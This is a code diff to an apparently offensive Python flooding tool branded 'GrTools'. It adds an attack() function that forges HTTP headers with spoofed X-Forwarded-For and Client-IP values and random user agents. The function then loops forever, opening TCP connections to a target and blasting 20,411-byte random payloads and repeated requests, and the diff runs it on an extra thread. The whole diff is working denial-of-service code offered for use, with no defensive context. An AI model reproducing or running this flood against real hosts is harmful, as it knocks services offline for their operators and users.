@@ -430,6 +430,50 @@ if method == "TCP":
             except socket.error:
                 print("[!] Attacked Slow ")
                 sock.close()
+                pass
+                
+                
+     def attack():
+        global useragents, socks3
+        get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
+        post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
+        referer = "Referer: " + random.choice(https) + ip + "\r\n"
+        connection = "Connection: Keep-Alive\r\n" + "\r\n"
+        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
+        socks = "socks5: " + random.choice(socks5) + "\r\n"
+        length = "Content-Length: 0\r\n"
+        socks3 = "socks3: " + random.choice(socks3) + "\r\n"
+        forward = "X-Forwarded-For: 1\r\n"
+        forwards = "Client-IP: " + ip + "\r\n"
+        accept = random.choice(useragents) + "\r\n"
+        mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
+        httpss = "User-Agent: " + random.choice(https) + "\r\n"
+        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+        request = get_host + post_host + httpss + mozila + socks3 + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
+        grtools = random._urandom(20411)
+        while True:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                sock.connect((ip, port))
+                for _ in range(50000):
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.sendall(str.encode(request))
+                    sock.sendall(str.encode(request))
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.sendall(str.encode(request))
+                    sock.sendall(str.encode(request))
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.sendall(str.encode(request))
+                    sock.sendall(str.encode(request))
+                print("[!] Attacked ")
+            except socket.error:
+                print("[!] Attacked Slow ")
+                sock.close()
+                pass
                 
     threads = []
     for _ in range(th):
@@ -438,6 +482,11 @@ if method == "TCP":
             t.daemon = True
             threads.append(t)
             t.start()
+            
+    t2 = threading.Thread(target=attack)
+    t2.daemon = True
+    threads.append(t2)
+    t2.start()
 
     for thread in threads:
         thread.join()
